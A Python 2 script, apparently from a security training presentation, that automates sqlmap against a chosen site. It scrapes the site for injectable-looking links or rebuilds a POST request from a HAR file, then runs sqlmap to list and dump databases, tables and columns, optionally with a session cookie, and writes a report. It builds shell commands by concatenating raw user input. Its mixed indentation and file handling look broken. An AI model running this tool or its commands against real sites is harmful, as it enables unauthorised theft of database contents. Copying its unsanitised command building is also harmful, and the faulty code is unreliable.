import json
import requests
import bs4
import os
import re
import logging

print("HPE CTY SQLMAP AUTOMATION")

print("""GET OR POST
	1. GET
	2. POST	
	""")
choose_get_post = int(input())

if choose_get_post == 1:
	url = raw_input("Enter a sql_url: ")  # for sql url
	print("The URL Entered is: ",url)
	res = requests.get(url)
	#print(res.text)
	soup = bs4.BeautifulSoup(res.text, 'html5lib')
	main = raw_input("Enter the main URL if any: ")

	list1=[]
	for link in soup.find_all('a',href=True):
		if main in link['href']:
			list1.append(link['href'])
		    	#print(link['href'])
		else:
		    list1.append(main+link['href'])
		    #print(main+link['href'])
	list2=[]

	for i in list1:
		if "php?" in i:
			list2.append(i)
	for i in list1:
		if "?id=" in i:
			list2.append(i)
	#print(list2)
	print(" ")
	print("choose an URL: ")
	print("Your option are :")
	for i in list2:
		print(i)
	print(" ")


	url = raw_input("Enter the choosen sql_url: ")  # for sql url
	print(" ")
	cookie = raw_input("Enter cookie of the website (optional) : ")

	level=1
	risk=1

	level = raw_input("Enter the level (integer 1-5) : ")

	risk = raw_input("Enter the risk (integer 1-3) : ")


	if cookie == "":

		#os.system("sqlmap -v 2 " + "-u " + url + " --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dbs --tables --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")

		def database():
		    os.system("sqlmap " + "-u " + url + " --dbs" + " --level=" + level + " --risk=" + risk)  # for show database's


		def tables():
		    #d_name = input("Enter a database name: ")
		    os.system("sqlmap " + "-u " + url + " --tables" + " --level=" + level + " --risk=" + risk)


		'''
		def col():
		    d_name = input("Enter a database name: ")
		    t_nmae = input("Enter a tables name: ")
		    os.system("sqlmap " + "-u " + url + " -D " + d_name + " -T" + t_nmae + " --column" + "--dump")
		'''

		def col_dump():
		    #d_name = input("Enter a database name: ")
		    #t_nmae = input("Enter a tables name: ")
		    #c_name = input("Enter a column name: ")
		    os.system("sqlmap " + "-u " + url + " --columns" + " --level=" + level + " --risk=" + risk)

		def a_dump():
		    os.system("sqlmap " + "-u " + url + " --dump" + " --level=" + level + " --risk=" + risk)

		def report():
		    os.system("sqlmap -v 2 " + "-u " + url + " --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dump --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")
		    scan_out= open("/home/kali/Downloads/HPE_CTY_Presentation/scan_out.txt","a+") 
		    report = open("/home/kali/Downloads/HPE_CTY_Presentation/report.txt","a+")

		    read1 = scan_out.read() 


                    report.write("HPE CTY REPORT")
		    report.write("\n")
		    report.write("Payload info:")
		    report.write("\n")
		    report.write("\n")


		    ###################### Payloads part below ###############################
		    Parameter = re.search(r"Parameter:",read1)
		    first = Parameter.span()[0]
		    dash = re.search(r"---.",read1)
		    last = dash.span()[1]
		    #print(Parameter.span())
		    #print(dash.span())

		    read2 = ((read1[first:last]))
		    #print(read2)
		    #report.write((read2))
		    info = re.search(r"back-end.DBMS",read2)
		    #print("info",info.span())
		    read3 = read2[0:info.span()[0]-22]
		    report.write((read3))

				    
		    ###################### Tables part below #################################

		    starting = info.span()[0]
		    ending = re.search(r"ending.@",read1)

		    while starting!=ending.span()[0]:
		    	    try:
				    Database = re.search("Database:",read1)
				    csv = re.search(".csv'",read1)
				    printing = read1[Database.span()[1]:csv.span()[0]]
				    report.write(printing)
				    read1 = read1[csv.span()[1]:]
				    starting = csv.span()[1]
			    except AttributeError:
				    break
		
		choose = 0
		while choose!=7:
			print("""
		    1. Database Dump
		    2. Tables names Dump
		    3. Column names Dump
		    4. Dump All
		    5. Run All
		    6. Report
		    7. Exit
		    """)
			choose = int(input("Enter a number: "))
			if choose == 1:
				database()
			elif choose == 2:
				tables()
			elif choose == 3:
				col_dump()
			elif choose == 4:
				a_dump()
			elif choose == 5:
				database()
				tables()
				col_dump()
				a_dump()
			elif choose == 6:
				report()
			elif choose == 7:
				#os.system("clear")
				print("Have a nice day")
				os.system("exit")
				choose = 7
			else:
				print("wrong input please Give value Between 1 and 7 !!")


	else:
		
		cookie = "\"" + cookie + "\""
		url = "\"" + url + "\""
		
		#os.system("sqlmap -v 2 " + "-u " + url + " --cookie=" + cookie + " --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dbs --tables --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")


		def database():
		    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --dbs" + " --level=" + level + " --risk=" + risk)  # for show database's


		def tables():
		    #d_name = input("Enter a database name: ")
		    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --tables" + " --level=" + level + " --risk=" + risk)


		'''
		def col():
		    d_name = input("Enter a database name: ")
		    t_nmae = input("Enter a tables name: ")
		    os.system("sqlmap " + "-u " + url + " -D " + d_name + " -T" + t_nmae + " --column" + "--dump")
		'''

		def col_dump():
		    #d_name = input("Enter a database name: ")
		    #t_nmae = input("Enter a tables name: ")
		    #c_name = input("Enter a column name: ")
		    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --columns" + " --level=" + level + " --risk=" + risk)

		def a_dump():
		    os.system("sqlmap " + "-u " + url + " --cookie=" + cookie + " --dump" + " --level=" + level + " --risk=" + risk)
		
		def report():
		    os.system("sqlmap -v 2 " + "-u " + url + " --cookie=" + cookie + " --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dump --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")
		    scan_out= open("/home/kali/Downloads/HPE_CTY_Presentation/scan_out.txt","a+") 
		    report = open("/home/kali/Downloads/HPE_CTY_Presentation/report.txt","a+")

		    read1 = scan_out.read() 


                    report.write("HPE CTY REPORT")
		    report.write("\n")
		    report.write("Payload info:")
		    report.write("\n")
		    report.write("\n")


		    ###################### Payloads part below ###############################
		    Parameter = re.search(r"Parameter:",read1)
		    first = Parameter.span()[0]
		    dash = re.search(r"---.",read1)
		    last = dash.span()[1]
		    #print(Parameter.span())
		    #print(dash.span())

		    read2 = ((read1[first:last]))
		    #print(read2)
		    #report.write((read2))
		    info = re.search(r"back-end.DBMS",read2)
		    #print("info",info.span())
		    read3 = read2[0:info.span()[0]-22]
		    report.write((read3))

				    
		    ###################### Tables part below #################################

		    starting = info.span()[0]
		    ending = re.search(r"ending.@",read1)

		    while starting!=ending.span()[0]:
		    	    try:
				    Database = re.search("Database:",read1)
				    csv = re.search(".csv'",read1)
				    printing = read1[Database.span()[1]:csv.span()[0]]
				    report.write(printing)
				    read1 = read1[csv.span()[1]:]
				    starting = csv.span()[1]
			    except AttributeError:
				    break
		choose = 0
		while choose!=7:
			print("""
		    1. Database Dump
		    2. Tables names Dump
		    3. Column names Dump
		    4. Dump All
		    5. Run All
		    6. Report            
		    7. exit
		    """)
			choose = int(input("Enter a number: "))
			if choose == 1:
				database()
			elif choose == 2:
				tables()
			elif choose == 3:
				col_dump()
			elif choose == 4:
				a_dump()
			elif choose == 5:
				database()
				tables()
				col_dump()
				a_dump()
			elif choose == 6:
				report()
			elif choose == 7:
				#os.system("clear")
				print("Have a nice day")
				os.system("exit")
				choose = 7
			else:
				print("wrong input please Give value Between 1 and 7 !!")
		

else:
	def har_import(dump_file):
	    with open(dump_file, 'r') as f:
		har_json = json.loads(f.read())
	    return har_json

	'''
	def traffic_auto_capture_har(har_json):
	    logger = logging.getLogger(__name__)
	    traffic_dict = {}
	    req_res_count = 0
	    list1 = []
	    list2 = []
	    dict1 = {}
	    har_total_traffic_count = len(har_json['log']['entries'])
	    print(har_total_traffic_count)
	    for i in range(0, har_total_traffic_count):
	    	if har_json['log']['entries'][i]['request']['method'] == "POST":
			requests = har_json['log']['entries'][i]['request'] 
			for j in har_json['log']['entries'][i]['request']['headers']:
				#print(len(har_json['log']['entries'][i]['request']['headers']))
				list1.append(j['name'])
				list2.append(j['value'])
				dict1[j['name']] = j['value']
			if 'postData' in har_json['log']['entries'][i]['request'].keys():
		        	if 'text' in har_json['log']['entries'][i]['request']['postData'].keys():
		            		req_data = har_json['log']['entries'][i]['request']['postData']['text']
	    #print(list1)
	    #print(list2)
	    print(req_data)
	    print(dict1)
	    print(requests)
	    return(list1,list2)
	list1,list2 = traffic_auto_capture_har(p)
	'''
	
	print("please enter the file location ")
	k = raw_input()
	har_json = har_import(k)
	logger = logging.getLogger(__name__)
	traffic_dict = {}
	req_res_count = 0
	list1 = []
	list2 = []
	dict1 = {}
	har_total_traffic_count = len(har_json['log']['entries'])
	#print(har_total_traffic_count)
	for i in range(0, har_total_traffic_count):
		if har_json['log']['entries'][i]['request']['method'] == "POST":
			method = har_json['log']['entries'][i]['request']['method']
			url = har_json['log']['entries'][i]['request']['url']
			HttpVer = har_json['log']['entries'][i]['request']['httpVersion']
			for j in har_json['log']['entries'][i]['request']['headers']:
				#print(len(har_json['log']['entries'][i]['request']['headers']))
				list1.append(j['name'])
				list2.append(j['value'])
				dict1[j['name']] = j['value']
			if 'postData' in har_json['log']['entries'][i]['request'].keys():
		        	if 'text' in har_json['log']['entries'][i]['request']['postData'].keys():
		            		req_data = har_json['log']['entries'][i]['request']['postData']['text']
			break
	#print(list1)
	#print(list2)
	#print(req_data)
	#print(dict1)

	
	new_post = open("/home/kali/Downloads/HPE_CTY_Presentation/new_post.txt","w+")
	#for i in range(len(list1)):
	#	if list1[i] == "Origin":
	#		url = url.replace(list2[i],"")
	new_post.write(method + " ")
	new_post.write(url + " ")
	new_post.write(HttpVer+ "\n")
	
	for i in range(len(list1)):	
		new_post.write(list1[i] + ": " + list2[i] + "\n")
	new_post.write("\n")
	new_post.write(req_data + " " + "\n")
	new_post.close()
	index_equals = req_data.index("=")
	print(index_equals) 
	req_data_para = req_data[:index_equals]
	print(req_data_para)
	level=1
	risk=1

	level = raw_input("Enter the level (integer 1-5) : ")

	risk = raw_input("Enter the risk (integer 1-3) : ")
	
	def database():
		    os.system("sqlmap " + "-r " + "new_post.txt " + " -p " +  req_data_para + " --dbs" + " --level=" + level + " --risk=" + risk)


	def tables():
		    #d_name = input("Enter a database name: ")
		    os.system("sqlmap " + "-r " + " new_post.txt" + " -p " +  req_data_para + " --tables" + " --level=" + level + " --risk=" + risk)


	def col_dump():
		    #d_name = input("Enter a database name: ")
		    #t_nmae = input("Enter a tables name: ")
		    #c_name = input("Enter a column name: ")
		    os.system("sqlmap " + "-r " + " new_post.txt" + " -p " +  req_data_para + " --columns" + " --level=" + level + " --risk=" + risk)

	def a_dump():
		    os.system("sqlmap " + "-r " + " new_post.txt" + " -p " +  req_data_para + " --dump --level=" + level + " --risk=" + risk)

	def report():
		    print("Creating report may take about 5 minutes ........")
		    os.system("sqlmap " + "-r " + " new_post.txt" + " -p " +  req_data_para + " --dump --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dump --technique=BEUST -s /home/kali/Downloads/HPE_CTY_Presentation/scan_report.txt --flush-session -t /home/kali/Downloads/HPE_CTY_Presentation/can_trace.txt --fresh-queries > /home/kali/Downloads/HPE_CTY_Presentation/scan_out.txt")
		    scan_out= open("/home/kali/Downloads/HPE_CTY_Presentation/scan_out.txt","a+") 
		    report = open("/home/kali/Downloads/HPE_CTY_Presentation/report.txt","a+")

		    read1 = scan_out.read() 


                    report.write("HPE CTY REPORT")
		    report.write("\n")
		    report.write("Payload info:")
		    report.write("\n")
		    report.write("\n")


		    ###################### Payloads part below ###############################
		    Parameter = re.search(r"Parameter:",read1)
		    first = Parameter.span()[0]
		    dash = re.search(r"---.",read1)
		    last = dash.span()[1]
		    #print(Parameter.span())
		    #print(dash.span())

		    read2 = ((read1[first:last]))
		    #print(read2)
		    #report.write((read2))
		    info = re.search(r"back-end.DBMS",read2)
		    #print("info",info.span())
		    read3 = read2[0:info.span()[0]-22]
		    report.write((read3))

				    
		    ###################### Tables part below #################################

		    starting = info.span()[0]
		    ending = re.search(r"ending.@",read1)

		    while starting!=ending.span()[0]:
		    	    try:
				    Database = re.search("Database:",read1)
				    csv = re.search(".csv'",read1)
				    printing = read1[Database.span()[1]:csv.span()[0]]
				    report.write(printing)
				    read1 = read1[csv.span()[1]:]
				    starting = csv.span()[1]
			    except AttributeError:
				    break

		    scan_out.close()
		    report.close()
	choose = 0
	while choose!=7:
		print("""
		    1. Database Dump
		    2. Tables names Dump
		    3. Column names Dump
		    4. Dump All
		    5. Run All
		    6. Report            
		    7. exit
		    """)
		choose = int(input("Enter a number: "))
		if choose == 1:
				database()
		elif choose == 2:
				tables()
		elif choose == 3:
				col_dump()
		elif choose == 4:
				a_dump()
		elif choose == 5:
				database()
				tables()
				col_dump()
				a_dump()
		elif choose == 6:
				report()
		elif choose == 7:
				#os.system("clear")
				print("Have a nice day")
				os.system("exit")
				choose = 7
		else:
				print("wrong input please Give value Between 1 and 7 !!")		
	
	








